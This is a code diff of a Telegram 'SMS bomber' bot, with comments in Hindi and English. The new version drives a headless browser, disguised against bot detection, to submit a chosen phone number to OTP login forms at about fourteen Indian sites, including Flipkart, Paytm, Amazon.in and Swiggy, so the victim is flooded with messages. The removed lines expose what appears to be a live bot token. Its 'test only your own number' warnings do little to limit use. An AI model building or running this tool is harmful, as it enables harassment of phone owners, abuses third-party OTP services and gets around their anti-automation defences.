@@ -1,132 +1,187 @@
 import telebot
-import requests
 import threading
 import time
+import random
+import re
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
+from webdriver_manager.chrome import ChromeDriverManager
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# अपना TOKEN और API Keys यहाँ डालो
-TOKEN = '8037281015:AAFkJ0Sp0IIRiFcg2ncZi481tppX505jYLE'
-FAST2SMS_KEY = 'YOUR_FAST2SMS_API_KEY'  # Optional
+# अपना BOT TOKEN यहाँ डालो
+TOKEN = 'YOUR_BOT_TOKEN_HERE'
 bot = telebot.TeleBot(TOKEN)
 
-# Global vars for bombing
-bombing_sessions = {}  # {user_id: {'active': True, 'number': str, 'count': int, 'sent': int}}
-stop_event = threading.Event()
+# Global
+bombing_sessions = {}
 
-def send_sms_via_api(number, message):
-    """SMS send via Fast2SMS (or fallback)"""
+# === INDIAN LOGIN PAGES WITH SELECTORS ===
+INDIAN_LOGIN_PAGES = [
+    # Flipkart
+    {'name': 'Flipkart', 'url': 'https://www.flipkart.com/account/login', 'phone': 'input[placeholder="Enter mobile number"]', 'submit': 'button[type="submit"]'},
+    
+    # Paytm
+    {'name': 'Paytm', 'url': 'https://accounts.paytm.com/signin', 'phone': 'input[name="mobile"]', 'submit': 'button[data-qa="sendOtp"]'},
+    
+    # Amazon.in
+    {'name': 'Amazon.in', 'url': 'https://www.amazon.in/ap/signin', 'phone': '#ap_email', 'submit': '#continue'},
+    
+    # Swiggy
+    {'name': 'Swiggy', 'url': 'https://www.swiggy.com/login', 'phone': 'input[placeholder="Enter mobile number"]', 'submit': 'button[type="submit"]'},
+    
+    # Zomato
+    {'name': 'Zomato', 'url': 'https://www.zomato.com/login', 'phone': 'input[name="phone"]', 'submit': 'button[type="submit"]'},
+    
+    # Ola Cabs
+    {'name': 'Ola', 'url': 'https://book.olawebcdn.com/', 'phone': 'input[name="mobile"]', 'submit': 'button[data-qa="sendOtp"]'},
+    
+    # Uber India
+    {'name': 'Uber', 'url': 'https://auth.uber.com/login/', 'phone': 'input[name="phoneNumber"]', 'submit': 'button[type="submit"]'},
+    
+    # Myntra
+    {'name': 'Myntra', 'url': 'https://www.myntra.com/login', 'phone': 'input[name="mobileNumber"]', 'submit': 'button[type="submit"]'},
+    
+    # BigBasket
+    {'name': 'BigBasket', 'url': 'https://www.bigbasket.com/auth/login/', 'phone': 'input[name="mobile"]', 'submit': 'button[type="submit"]'},
+    
+    # BookMyShow
+    {'name': 'BookMyShow', 'url': 'https://in.bookmyshow.com/persona/sign-in', 'phone': 'input[name="mobile"]', 'submit': 'button[type="submit"]'},
+    
+    # JioMart
+    {'name': 'JioMart', 'url': 'https://www.jiomart.com/customer/account/login', 'phone': 'input[name="login[username]"]', 'submit': 'button[type="submit"]'},
+    
+    # PhonePe
+    {'name': 'PhonePe', 'url': 'https://www.phonepe.com/login', 'phone': 'input[name="mobile"]', 'submit': 'button[data-qa="sendOtp"]'},
+    
+    # Meesho
+    {'name': 'Meesho', 'url': 'https://www.meesho.com/login', 'phone': 'input[placeholder="Enter Mobile Number"]', 'submit': 'button[type="submit"]'},
+    
+    # Groww
+    {'name': 'Groww', 'url': 'https://app.groww.in/login', 'phone': 'input[name="mobile"]', 'submit': 'button[type="submit"]'},
+]
+
+def setup_driver():
+    options = Options()
+    options.add_argument('--headless')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option('useAutomationExtension', False)
+    driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
+    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false});")
+    return driver
+
+def hit_login_page(driver, site, number):
     try:
-        if FAST2SMS_KEY != 'YOUR_FAST2SMS_API_KEY':
-            url = "https://www.fast2sms.com/dev/bulkV2"
-            data = {
-                'authorization': FAST2SMS_KEY,
-                'sender_id': 'FSTSMS',
-                'message': message,
-                'language': 'english',
-                'route': 'p',
-                'numbers': number
-            }
-            r = requests.post(url, data=data)
-            return r.json().get('return', {}).get('message') == 'success'
-        else:
-            # Dummy mode: Simulate send (no real SMS)
-            time.sleep(0.1)  # Simulate delay
-            return True
-    except:
+        driver.get(site['url'])
+        wait = WebDriverWait(driver, 12)
+
+        # Wait for phone field
+        phone_input = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, site['phone'])))
+        phone_input.clear()
+        phone_input.send_keys(number)
+
+        # Click submit
+        submit_btn = driver.find_element(By.CSS_SELECTOR, site['submit'])
+        driver.execute_script("arguments[0].click();", submit_btn)
+
+        time.sleep(3)
+        return True
+    except Exception as e:
+        print(f"[{site['name']}] Error: {str(e)}")
         return False
 
-def bomb_thread(user_id, number, count, message="Bomb Alert! 😈"):
-    """Thread for bombing"""
+def bomb_thread(user_id, number, count):
     session = bombing_sessions[user_id]
-    session['sent'] = 0
-    for i in range(count):
-        if not session['active']:
-            break
-        if send_sms_via_api(number, message):
-            session['sent'] += 1
-            bot.send_message(user_id, f"💣 Sent {session['sent']}/{count}")
-        time.sleep(1)  # Delay to avoid rate limit
-    session['active'] = False
-    bot.send_message(user_id, f"✅ Bombing complete: {session['sent']} SMS sent!")
+    session['sites_hit'] = []
+    driver = setup_driver()
+    
+    try:
+        for i in range(count):
+            if not session['active']: break
+            site = random.choice(INDIAN_LOGIN_PAGES)
+            bot.send_message(user_id, f"Bombing **{site['name']}**... ({i+1}/{count})")
+            
+            if hit_login_page(driver, site, number):
+                session['sites_hit'].append(site['name'])
+                bot.send_message(user_id, f"{site['name']} → OTP Sent!")
+            else:
+                bot.send_message(user_id, f"{site['name']} → Failed (CAPTCHA?)")
+            
+            time.sleep(random.uniform(5, 10))  # Anti-bot delay
+        
+        driver.quit()
+        hit_count = len(session['sites_hit'])
+        bot.send_message(user_id, f"*Bombing Complete!*\nSites Hit: {hit_count}\nList: {', '.join(session['sites_hit'])}", parse_mode='Markdown')
+    except Exception as e:
+        bot.send_message(user_id, f"Error: {str(e)}")
+    finally:
+        session['active'] = False
 
+# === BOT COMMANDS ===
 @bot.message_handler(commands=['start'])
 def start(message):
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("💣 Start Bomb", callback_data="bomb_help"))
-    markup.add(InlineKeyboardButton("🛑 Stop", callback_data="stop_help"))
-    bot.send_message(
-        message.chat.id,
-        """
-🔥 *SMS Bomber Bot* 🔥
+    markup.add(InlineKeyboardButton("Start Bomb", callback_data="help_bomb"))
+    bot.send_message(message.chat.id, """
+*Indian Login Pages SMS Bomber*
 
-⚠️ *Warning*: Use only for fun/testing. Illegal if misused!
+`/bomb 9876543210 5` → 5 sites पर OTP भेजेगा
 
-Usage: `/bomb 9876543210 10`
+*15+ Sites*: Flipkart, Paytm, Amazon, Swiggy, Zomato, Ola, Uber, Myntra, etc.
 
-👇 Buttons से help लो.
-        """,
-        parse_mode='Markdown',
-        reply_markup=markup
-    )
-
-@bot.message_handler(commands=['help'])
-def help_cmd(message):
-    bot.reply_to(message, """
-🛠️ *Commands*:
-
-`/bomb <number> <count>` → Bomb SMS (e.g., /bomb 9876543210 5)
-/stop → Stop current bombing
-
-*API Setup*: Fast2SMS key add करो for real SMS.
-    """, parse_mode='Markdown')
+*Warning*: सिर्फ अपना number test करो!
+    """, parse_mode='Markdown', reply_markup=markup)
 
 @bot.message_handler(commands=['bomb'])
-def start_bomb(message):
+def bomb_cmd(message):
     try:
-        parts = message.text.split()
-        if len(parts) < 3:
-            bot.reply_to(message, "❌ Usage: `/bomb 9876543210 10`", parse_mode='Markdown')
+        args = message.text.split()
+        if len(args) < 3:
+            bot.reply_to(message, "Usage: `/bomb 9876543210 5`", parse_mode='Markdown')
             return
-        number = parts[1]
-        count = int(parts[2])
-        if not number.isdigit() or len(number) != 10:
-            bot.reply_to(message, "❌ Invalid number: 10 digits only.")
+        number = re.sub(r'[^\d]', '', args[1])
+        count = int(args[2])
+        
+        if len(number) != 10:
+            bot.reply_to(message, "10 digits only!")
             return
-        if count > 50:  # Limit to prevent abuse
-            bot.reply_to(message, "❌ Max 50 SMS. Don't abuse!")
+        if count > 12:
+            bot.reply_to(message, "Max 12 sites!")
             return
         
         user_id = message.from_user.id
         if user_id in bombing_sessions and bombing_sessions[user_id]['active']:
-            bot.reply_to(message, "⚠️ Already bombing! Use /stop first.")
+            bot.reply_to(message, "Already running! Use /stop")
             return
         
-        bombing_sessions[user_id] = {'active': True, 'number': number, 'count': count}
-        bot.reply_to(message, f"🚀 Starting bomb on {number} x{count}...")
-        
+        bombing_sessions[user_id] = {'active': True, 'number': number, 'count': count, 'sites_hit': []}
         thread = threading.Thread(target=bomb_thread, args=(user_id, number, count))
         thread.start()
-    except ValueError:
-        bot.reply_to(message, "❌ Invalid count: Use number.")
+        bot.reply_to(message, f"Starting bomb on +91{number} × {count} sites...")
+    except:
+        bot.reply_to(message, "Invalid input!")
 
 @bot.message_handler(commands=['stop'])
-def stop_bomb(message):
+def stop_cmd(message):
     user_id = message.from_user.id
     if user_id in bombing_sessions:
         bombing_sessions[user_id]['active'] = False
-        bot.reply_to(message, f"🛑 Stopped bombing on {bombing_sessions[user_id]['number']}")
+        bot.reply_to(message, "Stopped!")
     else:
-        bot.reply_to(message, "ℹ️ No active bombing.")
+        bot.reply_to(message, "No active bomb.")
 
 @bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    if call.data == "bomb_help":
+def callback(call):
+    if call.data == "help_bomb":
         bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, "💣 `/bomb 9876543210 10` — Send 10 SMS to number.", parse_mode='Markdown')
-    elif call.data == "stop_help":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, "🛑 `/stop` — Halt the bomb.", parse_mode='Markdown')
+        bot.send_message(call.message.chat.id, "`/bomb 9876543210 5` → Start", parse_mode='Markdown')
 
-# Run Bot
-print("🤖 SMS Bomber Bot running... (Use ethically!)")
+# === RUN ===
+print("Indian Login Pages Bomber Bot Running...")
 bot.infinity_polling()
